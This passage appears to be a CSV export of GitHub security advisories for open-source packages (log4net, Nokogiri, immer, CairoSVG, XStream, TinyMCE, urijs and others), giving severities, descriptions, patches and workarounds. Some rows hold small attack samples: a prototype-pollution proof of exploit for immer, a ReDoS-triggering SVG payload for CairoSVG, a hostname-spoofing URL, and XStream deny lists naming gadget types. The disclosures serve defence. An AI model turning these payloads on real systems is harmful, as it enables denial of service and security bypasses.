* Additional eject tags not mentioned in the original advisory and the CSP mitigation line being truncated in the revised advisory reported by [Michał Bentkowski](https://twitter.com/SecurityMB) at Securitum

### For more information

If you have any questions or comments about this advisory:

* Open an issue at [https://github.com/mozilla/bleach/issues](https://github.com/mozilla/bleach/issues)
* Email us at [security@mozilla.org](mailto:security@mozilla.org)",pip
544,12851,log4net,GHSA-2cwj-8chv-9pp9,CVE-2018-1285,https://github.com/advisories/GHSA-2cwj-8chv-9pp9,critical,2021-01-29 19:47:23 UTC,XML External Entity attack in log4net,Apache log4net before 2.0.10 does not disable XML external entities when parsing log4net configuration files. This could allow for XXE-based attacks in applications that accept arbitrary configuration files from users.,nuget
545,16343,electron,GHSA-hvf8-h2qh-37m9,CVE-2020-26272,https://github.com/advisories/GHSA-hvf8-h2qh-37m9,moderate,2021-01-28 19:11:34 UTC,IPC messages delivered to the wrong frame in Electron,"### Impact
IPC messages sent from the main process to a subframe in the renderer process, through `webContents.sendToFrame`, `event.reply` or when using the `remote` module, can in some cases be delivered to the wrong frame.

If your app does ANY of the following, then it is impacted by this issue:
- Uses `remote`
- Calls `webContents.sendToFrame`
- Calls `event.reply` in an IPC message handler

### Patches
This has been fixed in the following versions:

- 9.4.0
- 10.2.0
- 11.1.0
- 12.0.0-beta.9

### Workarounds
There are no workarounds for this issue.

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",npm
546,18823,nokogiri,GHSA-vr8q-g5c7-m54m,CVE-2020-26247,https://github.com/advisories/GHSA-vr8q-g5c7-m54m,moderate,2020-12-30 18:35:06 UTC,"Nokogiri::XML::Schema trusts input by default, exposing risk of XXE vulnerability","### Severity

Nokogiri maintainers have evaluated this as [__Low Severity__ (CVSS3 2.6)](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N).


### Description

In Nokogiri versions <= 1.11.0.rc3, XML Schemas parsed by `Nokogiri::XML::Schema` are **trusted** by default, allowing external resources to be accessed over the network, potentially enabling XXE or SSRF attacks.

This behavior is counter to the security policy followed by Nokogiri maintainers, which is to treat all input as **untrusted** by default whenever possible.

Please note that this security fix was pushed into a new minor version, 1.11.x, rather than a patch release to the 1.10.x branch, because it is a breaking change for some schemas and the risk was assessed to be ""Low Severity"".


### Affected Versions

Nokogiri `<= 1.10.10` as well as prereleases `1.11.0.rc1`, `1.11.0.rc2`, and `1.11.0.rc3`


### Mitigation

There are no known workarounds for affected versions. Upgrade to Nokogiri `1.11.0.rc4` or later.

If, after upgrading to `1.11.0.rc4` or later, you wish to re-enable network access for resolution of external resources (i.e., return to the previous behavior):

1. Ensure the input is trusted. Do not enable this option for untrusted input.
2. When invoking the `Nokogiri::XML::Schema` constructor, pass as the second parameter an instance of `Nokogiri::XML::ParseOptions` with the `NONET` flag turned off.

So if your previous code was:

``` ruby
# in v1.11.0.rc3 and earlier, this call allows resources to be accessed over the network
# but in v1.11.0.rc4 and later, this call will disallow network access for external resources
schema = Nokogiri::XML::Schema.new(schema)

# in v1.11.0.rc4 and later, the following is equivalent to the code above
# (the second parameter is optional, and this demonstrates its default value)
schema = Nokogiri::XML::Schema.new(schema, Nokogiri::XML::ParseOptions::DEFAULT_SCHEMA)
```

Then you can add the second parameter to indicate that the input is trusted by changing it to:

``` ruby
# in v1.11.0.rc3 and earlier, this would raise an ArgumentError 
# but in v1.11.0.rc4 and later, this allows resources to be accessed over the network
schema = Nokogiri::XML::Schema.new(trusted_schema, Nokogiri::XML::ParseOptions.new.nononet)
```


### References

- [This issue's public advisory](https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vr8q-g5c7-m54m)
- [Original Hackerone report (private)](https://hackerone.com/reports/747489)
- [OWASP description of XXE attack](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
- [OWASP description of SSRF attack](https://www.owasp.org/index.php/Server_Side_Request_Forgery)


### Credit 

This vulnerability was independently reported by @eric-therond and @gucki.

The Nokogiri maintainers would like to thank [HackerOne](https://hackerone.com/nokogiri) for providing a secure, responsible mechanism for reporting, and for providing their fantastic service to us.",rubygems
547,38410,io.kubernetes:client-java,GHSA-cghx-9gcr-r42x,CVE-2020-8570,https://github.com/advisories/GHSA-cghx-9gcr-r42x,high,2021-01-29 18:12:54 UTC,Path Traversal in the Java Kubernetes Client,Kubernetes Java client libraries in version 10.0.0 and versions prior to 9.0.1 allow writes to paths outside of the current directory when copying multiple files from a remote pod which sends a maliciously crafted archive. This can potentially overwrite any files on the system of the process executing the client code.,maven
548,20776,pysaml2,GHSA-5p3x-r448-pc62,CVE-2021-21239,https://github.com/advisories/GHSA-5p3x-r448-pc62,moderate,2021-01-21 14:12:18 UTC,Improper Verification of Cryptographic Signature in PySAML2,"### Impact

All users of pysaml2 that use the default `CryptoBackendXmlSec1` backend and need to verify signed SAML documents are impacted. `pysaml2 <= 6.4.1` does not ensure that a signed SAML document is correctly signed. The default `CryptoBackendXmlSec1` backend is using the `xmlsec1` binary to verify the signature of signed SAML documents, but by default, `xmlsec1` accepts any type of key found within the given document. `xmlsec1` needs to be configured explicitly to only use only _x509 certificates_ for the verification process of the SAML document signature.

### Patches

Users should upgrade to pysaml2 `v6.5.0`.

### Workarounds

No workaround provided at this point.

### References

This issue has been reported in the past at the xmlsec1 mailing list:
https://www.aleksey.com/pipermail/xmlsec/2013/009717.html

### Credits

- Brian Wolff

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [pysaml2](https://github.com/IdentityPython/pysaml2)
* Email us at [the incident-response address](mailto:incident-response@idpy.org)
",pip
549,20776,pysaml2,GHSA-f4g9-h89h-jgv9,CVE-2021-21238,https://github.com/advisories/GHSA-f4g9-h89h-jgv9,low,2021-01-21 14:12:16 UTC,SAML XML Signature wrapping in PySAML2,"### Impact

All users of pysaml2 that use the default `CryptoBackendXmlSec1` backend and need to verify signed SAML documents are impacted. `pysaml2 <= 6.4.1` does not validate the SAML document against an XML schema. This allows invalid XML documents to trick the verification process, by presenting elements with a valid signature inside elements whose content has been malformed. The verification is offloaded to `xmlsec1` and `xmlsec1` will not validate every signature in the given document, but only the first it finds in the given scope.

### Patches

Users should upgrade to pysaml2 `v6.5.0`.

### Workarounds

No workaround provided at this point.

### References

No references provided at this point.

### Credits

- Victor Schönfelder Garcia (isits AG International School of IT Security)
- Juraj Somorovsky (Paderborn University)
- Vladislav Mladenov (Ruhr University Bochum)

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [pysaml2](https://github.com/IdentityPython/pysaml2)
* Email us at [the incident-response address](mailto:incident-response@idpy.org)",pip
550,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-5949-rw7g-wx7w,CVE-2021-20190,https://github.com/advisories/GHSA-5949-rw7g-wx7w,high,2021-01-20 21:20:15 UTC,Deserialization of untrusted data in jackson-databind,A flaw was found in jackson-databind before 2.9.10.7. FasterXML mishandles the interaction between serialization gadgets and typing. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.,maven
551,16937,immer,GHSA-9qmh-276g-x5pj,CVE-2020-28477,https://github.com/advisories/GHSA-9qmh-276g-x5pj,high,2021-01-20 21:27:56 UTC,Prototype Pollution in immer,"## Overview

Affected versions of immer are vulnerable to Prototype Pollution.

## Proof of exploit

```
const {applyPatches, enablePatches} = require(""immer"");
enablePatches();
let obj = {};
console.log(""Before : "" + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ ""__proto__"", ""polluted"" ], value: ""yes"" } ]);
// applyPatches({}, [ { op: 'replace', path: [ ""__proto__"", ""polluted"" ], value: ""yes"" } ]);
console.log(""After : "" + obj.polluted);
```

## Remediation

Version 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.",npm
552,16049,socket.io,GHSA-fxwf-4rqh-v8g3,CVE-2020-28481,https://github.com/advisories/GHSA-fxwf-4rqh-v8g3,moderate,2021-01-20 21:22:37 UTC,Insecure defaults due to CORS misconfiguration in socket.io,The package socket.io before 2.4.0 are vulnerable to Insecure Defaults due to CORS Misconfiguration. All domains are whitelisted by default.,npm
553,17543,gsap,GHSA-6g8v-hpgw-h2v7,CVE-2020-28478,https://github.com/advisories/GHSA-6g8v-hpgw-h2v7,high,2021-01-20 21:21:50 UTC,Prototype pollution in gsap,There is a prototype pollution vulnerability in gsap which affects all versions before 3.6.0.,npm
554,19336,rails_admin,GHSA-wjx2-7hqq-8h7m,CVE-2020-36190,https://github.com/advisories/GHSA-wjx2-7hqq-8h7m,moderate,2021-01-14 19:17:16 UTC,rails_admin ruby gem XSS vulnerability,RailsAdmin (aka rails_admin) before 1.4.3 and 2.x before 2.0.2 allows XSS via nested forms.,rubygems
555,13218,ServiceStack,GHSA-v5rv-hpxg-8x49,CVE-2020-28042,https://github.com/advisories/GHSA-v5rv-hpxg-8x49,moderate,2021-01-13 19:13:11 UTC,Signature validation bypass in ServiceStack,ServiceStack before 5.9.2 mishandles JWT signature verification unless an application has a custom ValidateToken function that establishes a valid minimum length for a signature.,nuget
556,37675,org.bouncycastle:bcprov-jdk14,GHSA-2mh8-gx2m-mr75,CVE-2019-17359,https://github.com/advisories/GHSA-2mh8-gx2m-mr75,high,2019-10-17 18:15:16 UTC,Out-of-Memory Error in Bouncy Castle Crypto,"The ASN.1 parser in Bouncy Castle Crypto (aka BC Java) 1.63 can trigger a large attempted memory allocation, and resultant OutOfMemoryError error, via crafted ASN.1 data. This is fixed in 1.64.",maven
557,18853,redcarpet,GHSA-q3wr-qw3g-3p4h,CVE-2020-26298,https://github.com/advisories/GHSA-q3wr-qw3g-3p4h,moderate,2021-01-11 19:06:10 UTC,Injection/XSS in Redcarpet,"Redcarpet is a Ruby library for Markdown processing. In Redcarpet before version 3.5.1, there is an injection vulnerability which can enable a cross-site scripting attack. In affected versions no HTML escaping was being performed when processing quotes. This applies even when the `:escape_html` option was being used.  This is fixed in version 3.5.1 by the referenced commit.",rubygems
558,19835,lxml,GHSA-pgww-xf46-h92r,CVE-2020-27783,https://github.com/advisories/GHSA-pgww-xf46-h92r,moderate,2021-01-07 21:54:01 UTC,lxml vulnerable to Cross-site Scripting,"A XSS vulnerability was discovered in python-lxml's clean module. The module's parser didn't properly imitate browsers, which caused different behaviors between the sanitizer and the user's page. A remote attacker could exploit this flaw to run arbitrary HTML/JS code.",pip
559,36452,org.apache.flink:flink-runtime_2.11,GHSA-395w-qhqr-9fr6,CVE-2020-17519,https://github.com/advisories/GHSA-395w-qhqr-9fr6,moderate,2021-01-06 20:01:34 UTC,Path Traversal in Apache Flink,A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process. Access is restricted to files accessible by the JobManager process. All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed. The issue was fixed in commit b561010b0ee741543c3953306037f00d7a9f0801 from apache/flink:master.,maven
560,18135,tinymce,GHSA-w7jx-j77m-wp65,,https://github.com/advisories/GHSA-w7jx-j77m-wp65,moderate,2021-01-06 19:27:54 UTC,Cross-site scripting vulnerability in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the URL sanitization logic of the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or APIs. This impacts all users who are using TinyMCE 5.5.1 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.6.0 by improved URL sanitization logic.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.6.0 or higher
- Manually sanitize `iframe`, `object` and `embed` URL attributes using a [TinyMCE node filter](https://www.tiny.cloud/docs/api/tinymce.html/tinymce.html.domparser/#addnodefilter).
- Disable `iframe`, `object`, and `embed` elements in your content using the [invalid_elements](https://www.tiny.cloud/docs/configure/content-filtering/#invalid_elements) setting.

#### Example: Sanitizing using a node filter
```js
editor.parser.addNodeFilter('iframe,object,embed', function(nodes) {
  nodes.forEach(function(node) {
    if (node.attributes) {
      node.attributes.forEach(function(attr) {
        var name = attr.name;
        var value = attr.value;
        // Sanitize the attribute value here or remove it entirely
        var sanitizedValue = ...;
        node.attr(name, santizedValue);
      });
    }
  });
});
```

#### Example: Using invalid_elements
```js
invalid_elements: 'iframe,object,embed'
```

### Acknowledgements
Tiny Technologies would like to thank Aaron Bishop at SecurityMetrics for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes56/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",npm
561,18135,tinymce,GHSA-h96f-fc7c-9r55,,https://github.com/advisories/GHSA-h96f-fc7c-9r55,low,2021-01-06 19:25:46 UTC,Regex denial of service vulnerability in codesample plugin,"### Impact
A regex denial of service (ReDoS) vulnerability was discovered in a dependency of the `codesample` plugin. The vulnerability allowed poorly formed ruby code samples to lock up the browser while performing syntax highlighting. This impacts users of the `codesample` plugin using TinyMCE 5.5.1 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.6.0 by upgrading to a version of the dependency without the vulnerability.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.6.0 or higher
- Disable the `codesample` plugin
- Disable ruby code samples using the [codesample_languages](https://www.tiny.cloud/docs/plugins/opensource/codesample/#exampleusingcodesample_languages) setting
- Override the PrismJS syntax highlighter to version 1.21.0 or higher using the [codesample_global_prismjs](https://www.tiny.cloud/docs/plugins/opensource/codesample/#codesample_global_prismjs) setting

### Acknowledgements
Tiny Technologies would like to thank Erik Krogh Kristensen at GitHub for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes56/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](http://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",npm
562,29328,CairoSVG,GHSA-hq37-853p-g5cf,CVE-2021-21236,https://github.com/advisories/GHSA-hq37-853p-g5cf,moderate,2021-01-06 16:57:50 UTC,Regular Expression Denial of Service in CairoSVG,"# Doyensec Vulnerability Advisory 

* Regular Expression Denial of Service (REDoS) in cairosvg
* Affected Product: CairoSVG v2.0.0+
* Vendor: https://github.com/Kozea
* Severity: Medium
* Vulnerability Class: Denial of Service
* Author(s): Ben Caller ([Doyensec](https://doyensec.com))

## Summary

When processing SVG files, the python package CairoSVG uses two regular expressions which are vulnerable to Regular Expression Denial of Service (REDoS).
If an attacker provides a malicious SVG, it can make cairosvg get stuck processing the file for a very long time.

## Technical description

The vulnerable regular expressions are

https://github.com/Kozea/CairoSVG/blob/9c4a982b9a021280ad90e89707eacc1d114e4ac4/cairosvg/colors.py#L190-L191

The section between 'rgb(' and the final ')' contains multiple overlapping groups.

Since all three infinitely repeating groups accept spaces, a long string of spaces causes catastrophic backtracking when it is not followed by a closing parenthesis.

The complexity is cubic, so doubling the length of the malicious string of spaces makes processing take 8 times as long.

## Reproduction steps

Create a malicious SVG of the form:

    <svg width=""1"" height=""1""><rect fill=""rgb(                     ;""/></svg>

with the following code:

    '<svg width=""1"" height=""1""><rect fill=""rgb(' + (' ' * 3456) + ';""/></svg>'

Note that there is no closing parenthesis before the semi-colon.

Run cairosvg e.g.:

    cairosvg cairo-redos.svg -o x.png

and notice that it hangs at 100% CPU. Increasing the number of spaces increases the processing time with cubic complexity.

## Remediation

Fix the regexes to avoid overlapping parts. Perhaps remove the [ \n\r\t]* groups from the regex, and use .strip() on the returned capture group.

## Disclosure timeline

- 2020-12-30: Vulnerability disclosed via email to CourtBouillon",pip
563,15862,axios,GHSA-4w2v-q235-vp99,CVE-2020-28168,https://github.com/advisories/GHSA-4w2v-q235-vp99,moderate,2021-01-04 20:59:40 UTC,Axios vulnerable to Server-Side Request Forgery,Axios NPM package 0.21.0 contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address.,npm
564,14219,HtmlSanitizer,GHSA-8j9v-h2vp-2hhv,CVE-2020-26293,https://github.com/advisories/GHSA-8j9v-h2vp-2hhv,low,2021-01-04 18:22:11 UTC,XSS in HtmlSanitizer,"### Impact

If you have explicitly allowed the `<style>` tag, an attacker could craft HTML that includes script after passing through the sanitizer. The default settings disallow the `<style>` tag so there is no risk if you have not explicitly allowed the `<style>` tag.

### Patches

The problem has been fixed in version 5.0.372.

### Workarounds

Remove the `<style>` tag from the set of allowed tags.

### For more information

If you have any questions or comments about this advisory open an issue in https://github.com/mganss/HtmlSanitizer

### Credits

This issue was discovered by Michal Bentkowski of Securitum.",nuget
565,17237,urijs,GHSA-3329-pjwv-fjpg,CVE-2020-26291,https://github.com/advisories/GHSA-3329-pjwv-fjpg,moderate,2020-12-30 23:40:48 UTC,Hostname spoofing via backslashes in URL,"### Impact
If using affected versions to determine a URL's hostname, the hostname can be spoofed by using a backslash (`\`) character followed by an at (`@`) character. If the hostname is used in security decisions, the decision may be incorrect.

Depending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.

Example URL: `https://expected-example.com\@observed-example.com`
Escaped string: `https://expected-example.com\\@observed-example.com` (JavaScript strings must escape backslash)

Affected versions incorrectly return `observed-example.com`. Patched versions correctly return `expected-example.com`. Patched versions match the behavior of other parsers which implement the [WHATWG URL specification](https://url.spec.whatwg.org/), including web browsers and [Node's built-in URL class](https://nodejs.org/api/url.html).

### Patches
Version 1.19.4 is patched against all known payload variants. Version 1.19.3 has a partial patch but is still vulnerable to a payload variant.

### References
https://github.com/medialize/URI.js/releases/tag/v1.19.4 (complete fix for this bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.3 (partial fix for this bypass)
[PR #233](https://github.com/medialize/URI.js/pull/233) (initial fix for backslash handling)

### For more information
If you have any questions or comments about this advisory, open an issue in https://github.com/medialize/URI.js

### Reporter credit
[Alesandro Ortiz](https://AlesandroOrtiz.com)",npm
566,30675,jupyter-server,GHSA-9f66-54xg-pc2c,CVE-2020-26275,https://github.com/advisories/GHSA-9f66-54xg-pc2c,moderate,2020-12-21 18:01:41 UTC,Jupyter Server open redirect vulnerability,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Open redirect vulnerability - a maliciously crafted link to a jupyter server could redirect the browser to a different website.

All jupyter servers running without a base_url prefix are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts. A link to your jupyter server may *appear* safe, but ultimately redirect to a spoofed server on the public internet. This same vulnerability was patched in upstream notebook v5.7.8.

### Patches

_Has the problem been patched? What versions should users upgrade to?_

Patched in jupyter_server 1.1.1. If upgrade is not available, a workaround can be to run your server on a url prefix:

```
jupyter server --ServerApp.base_url=/jupyter/
```

### References

[OWASP page on open redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list [security@ipython.org](mailto:security@ipython.org).

Credit: Yaniv Nizry from CxSCA group at Checkmarx",pip
567,29225,tlslite-ng,GHSA-wvcv-832q-fjg7,CVE-2020-26263,https://github.com/advisories/GHSA-wvcv-832q-fjg7,low,2020-12-21 16:56:37 UTC,RSA weakness in tslite-ng,"### Impact
The code that performs decryption and padding check in RSA PKCS#1 v1.5 decryption is data dependant.
In particular, code in current (as of 0.8.0-alpha38) master
https://github.com/tlsfuzzer/tlslite-ng/blob/0812ed60860fa61a6573b2c0e18771414958f46d/tlslite/utils/rsakey.py#L407-L441
and code in 0.7.5 branch
https://github.com/tlsfuzzer/tlslite-ng/blob/acdde3161124d6ae37c506b3476aea9996d12e97/tlslite/utils/rsakey.py#L394-L425
has multiple ways in which it leaks information (for one, it aborts as soon as the plaintext doesn't start with 0x00, 0x02) about the decrypted ciphertext (both the bit length of the decrypted message as well as where the first unexpected byte lays).

All TLS servers that enable RSA key exchange as well as applications that use the RSA decryption API directly are vulnerable.

All previous versions of tlslite-ng are vulnerable.

### Patches
The patches to fix it are proposed in 
https://github.com/tlsfuzzer/tlslite-ng/pull/438
https://github.com/tlsfuzzer/tlslite-ng/pull/439

Note: the patches depend on Python processing the individual bytes in side-channel free manner, this is known to not be the case: https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/
As such, users that require side-channel resistance are recommended to use different TLS implementations, as stated in the [security policy](https://github.com/tlsfuzzer/tlslite-ng/blob/master/SECURITY.md) of tlslite-ng.

### Workarounds
There is no way to workaround this issue.

### References
https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/

### For more information
If you have any questions or comments about this advisory please open an issue in [tlslite-ng](https://github.com/tlsfuzzer/tlslite-ng/issues).",pip
568,34016,com.thoughtworks.xstream:xstream,GHSA-4cch-wxpw-8p28,CVE-2020-26258,https://github.com/advisories/GHSA-4cch-wxpw-8p28,high,2020-12-21 16:28:42 UTC,Server-Side Forgery Request can be activated unmarshalling with XStream,"### Impact
The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.15.

### Workarounds
The reported vulnerability does not exist running Java 15 or higher.

No user is affected, who followed the recommendation to setup XStream's Security Framework with a whitelist! Anyone relying on XStream's default blacklist can immediately switch to a whilelist for the allowed types to avoid the vulnerability.

Users of XStream 1.4.14 or below who still insist to use XStream default blacklist - despite that clear recommendation - can use a workaround depending on their version in use.

Users of XStream 1.4.14 can simply add two lines to XStream's setup code:
```Java
xstream.denyTypes(new String[]{ ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypesByRegExp(new String[]{ "".*\\.ReadAllStream\\$FileStream"" });
```

Users of XStream 1.4.14 to 1.4.13 can simply add three lines to XStream's setup code:
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"", ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
xstream.denyTypesByRegExp(new String[]{ "".*\\.ReadAllStream\\$FileStream"" });
```
Users of XStream 1.4.12 to 1.4.7 who want to use XStream with a black list will have to setup such a list from scratch and deny at least the following types: _javax.imageio.ImageIO$ContainsFilter_, _java.beans.EventHandler_, _java.lang.ProcessBuilder_, _jdk.nashorn.internal.objects.NativeString.class_, _java.lang.Void_ and _void_ and deny several types by name pattern.
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"", ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, ""jdk.nashorn.internal.objects.NativeString"", java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });
xstream.denyTypesByRegExp(new String[]{ "".*\\$LazyIterator"", ""javax\\.crypto\\..*"", "".*\\.ReadAllStream\\$FileStream"" });
```
Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:
```Java
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class
        || type.getName().equals(""javax.imageio.ImageIO$ContainsFilter"") || type.getName().equals(""jdk.nashorn.internal.objects.NativeString"")
        || type == java.lang.Void.class || void.class || Proxy.isProxy(type))
        || type.getName().startsWith(""javax.crypto."") || type.getName().endsWith(""$LazyIterator"") || type.getName().endsWith("".ReadAllStream$FileStream""));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }
}, XStream.PRIORITY_LOW);
```
 
### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
569,34016,com.thoughtworks.xstream:xstream,GHSA-jfvx-7wrx-43fh,CVE-2020-26259,https://github.com/advisories/GHSA-jfvx-7wrx-43fh,moderate,2020-12-21 16:28:26 UTC,XStream vulnerable to an Arbitrary File Deletion on the local host when unmarshalling,"### Impact
The vulnerability may allow a remote attacker to delete arbitrary know files on the host as log as the executing process has sufficient rights only by manipulating the processed input stream.

### Patches
If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.15.

### Workarounds
The reported vulnerability does only exist with a JAX-WS runtime on the classpath.

No user is affected, who followed the recommendation to setup XStream's Security Framework with a whitelist! Anyone relying on XStream's default blacklist can immediately switch to a whilelist for the allowed types to avoid the vulnerability.

Users of XStream 1.4.14 or below who still insist to use XStream default blacklist - despite that clear recommendation - can use a workaround depending on their version in use.

Users of XStream 1.4.14 can simply add two lines to XStream's setup code:
```Java
xstream.denyTypes(new String[]{ ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypesByRegExp(new String[]{ "".*\\.ReadAllStream\\$FileStream"" });
```

Users of XStream 1.4.14 to 1.4.13 can simply add three lines to XStream's setup code:
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"", ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
xstream.denyTypesByRegExp(new String[]{ "".*\\.ReadAllStream\\$FileStream"" });
```
Users of XStream 1.4.12 to 1.4.7 who want to use XStream with a black list will have to setup such a list from scratch and deny at least the following types: _javax.imageio.ImageIO$ContainsFilter_, _java.beans.EventHandler_, _java.lang.ProcessBuilder_, _jdk.nashorn.internal.objects.NativeString.class_, _java.lang.Void_ and _void_ and deny several types by name pattern.
```Java
xstream.denyTypes(new String[]{ ""javax.imageio.ImageIO$ContainsFilter"", ""jdk.nashorn.internal.objects.NativeString"" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, ""jdk.nashorn.internal.objects.NativeString"", java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });
xstream.denyTypesByRegExp(new String[]{ "".*\\$LazyIterator"", ""javax\\.crypto\\..*"", "".*\\.ReadAllStream\\$FileStream"" });
```
Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:
```Java
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class
        || type.getName().equals(""javax.imageio.ImageIO$ContainsFilter"") || type.getName().equals(""jdk.nashorn.internal.objects.NativeString"")
        || type == java.lang.Void.class || void.class || Proxy.isProxy(type))
        || type.getName().startsWith(""javax.crypto."") || type.getName().endsWith(""$LazyIterator"") || type.getName().endsWith("".ReadAllStream$FileStream""));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException(""Unsupported type due to security reasons."");
  }
}, XStream.PRIORITY_LOW);
```
  
### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)",maven
570,16146,node-notifier,GHSA-5fw9-fq32-wv5p,CVE-2020-7789,https://github.com/advisories/GHSA-5fw9-fq32-wv5p,moderate,2020-12-21 16:04:07 UTC,OS Command Injection in node-notifier,This affects the package node-notifier before 8.0.1. It allows an attacker to run arbitrary commands on Linux machines due to the options params not being sanitised when being passed an array.,npm
571,20810,apache-airflow,GHSA-6r3p-fcvm-xh7c,CVE-2020-17513,https://github.com/advisories/GHSA-6r3p-fcvm-xh7c,moderate,2020-12-17 21:00:58 UTC,SSRF vulnerability in Arache Airflow,"In Apache Airflow versions prior to 1.10.13, the Charts and Query View of the old (Flask-admin based) UI were vulnerable for SSRF attack.",pip
572,20810,apache-airflow,GHSA-cvcq-gmc3-q6m8,CVE-2020-17511,https://github.com/advisories/GHSA-cvcq-gmc3-q6m8,moderate,2020-12-17 21:00:56 UTC,Plain text storage of passwords in Apache Airflow,"In Airflow versions prior to 1.10.13, when creating a user using airflow CLI, the password gets logged in plain text in the Log table in Airflow Metadatase. Same happened when creating a Connection with a password field.",pip
573,17429,ecstatic,GHSA-jc84-3g44-wf2q,CVE-2019-10775,https://github.com/advisories/GHSA-jc84-3g44-wf2q,moderate,2020-12-15 16:52:17 UTC,Denial of Service in ecstatic,ecstatic have a denial of service vulnerability. Successful exploitation could lead to crash of an application.,npm
574,17429,ecstatic,GHSA-9q64-mpxx-87fg,,https://github.com/advisories/GHSA-9q64-mpxx-87fg,high,2020-04-01 16:35:08 UTC,Open Redirect in ecstatic,"Versions of `ecstatic` prior to 4.1.2, 3.3.2 or 2.2.2 are vulnerable to Open Redirect. The package fails to validate redirects, allowing attackers to craft requests that result in an `HTTP 301` redirect to any other domains.


## Recommendation

If using `ecstatic` 4.x, upgrade to 4.1.2 or later.
If using `ecstatic` 3.x, upgrade to 3.3.2 or later.
If using `ecstatic` 2.x, upgrade to 2.2.2 or later.",npm
575,20741,tensorflow,GHSA-q263-fvxm-m5mw,CVE-2020-26271,https://github.com/advisories/GHSA-q263-fvxm-m5mw,low,2020-12-10 19:07:34 UTC,Heap out of bounds access in MakeEdge in TensorFlow,"### Impact
